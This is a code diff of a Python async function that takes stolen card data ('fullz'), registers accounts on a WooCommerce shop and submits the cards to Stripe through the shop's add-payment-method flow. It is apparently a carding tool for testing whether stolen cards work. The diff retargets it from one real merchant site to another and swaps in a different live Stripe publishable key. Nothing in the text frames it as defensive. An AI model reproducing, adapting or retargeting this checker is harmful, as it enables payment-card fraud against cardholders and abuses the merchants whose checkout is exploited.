@@ -97,7 +97,7 @@ async def create_payment_method(fullz: str, session: httpx.AsyncClient, proxy_ur
 
         # STEP 1: register nonce
         register_nonce = generate_nonce()
-        response = await session.get("https://snoopyspetsupplies.ie/my-account/", headers=headers)
+        response = await session.get("https://crystalempireaustralia.com.au/my-account", headers=headers)
         _ = gets(response.text, 'id="woocommerce-register-nonce" name="woocommerce-register-nonce" value="', '" />')
 
         # STEP 2: register user
@@ -107,10 +107,10 @@ async def create_payment_method(fullz: str, session: httpx.AsyncClient, proxy_ur
             "_wp_http_referer": "/my-account/",
             "register": "Register",
         }
-        await session.post("https://snoopyspetsupplies.ie/my-account", headers=headers, data=data)
+        await session.post("https://crystalempireaustralia.com.au/my-account/", headers=headers, data=data)
 
         # STEP 3: add payment page
-        response = await session.get("https://snoopyspetsupplies.ie/my-account/add-payment-method/", headers=headers)
+        response = await session.get("https://crystalempireaustralia.com.au/my-account/add-payment-method/", headers=headers)
         setup_nonce = gets(response.text, '"createAndConfirmSetupIntentNonce":"', '","')
 
         # STEP 4: Stripe payment method
@@ -121,7 +121,7 @@ async def create_payment_method(fullz: str, session: httpx.AsyncClient, proxy_ur
             "card[exp_month]": mes,
             "card[exp_year]": ano,
             "billing_details[address][country]": "PK",
-            "key": "pk_live_51PGx9TJxNKubmI9BngUz5kw8tU6OfoBEWwYoBCm2xN4iPTO6eGbcuZVojYyNF9rJ2gFMo5fNQeEUJyVYMNg37rFJ00S3RRrp8s",
+            "key": "pk_live_51NXBbQFGChZ8k6HH25Dj3nJ2I1r7ZiX2cZrZsXFC5JZX8ZwmDgfC9RvFzQinsL9sL6hkqNUdFtbVbnNDemBUrv4m00MCFaMvxn",
         }
         resp = await session.post("https://api.stripe.com/v1/payment_methods", headers=headers, data=data)
 
@@ -146,7 +146,7 @@ async def create_payment_method(fullz: str, session: httpx.AsyncClient, proxy_ur
             '_ajax_nonce': setup_nonce,
         }
         
-        final = await session.post("https://snoopyspetsupplies.ie", params=params, headers=headers, data=data)
+        final = await session.post("https://crystalempireaustralia.com.au", params=params, headers=headers, data=data)
 
         # RESPONSE
         try:
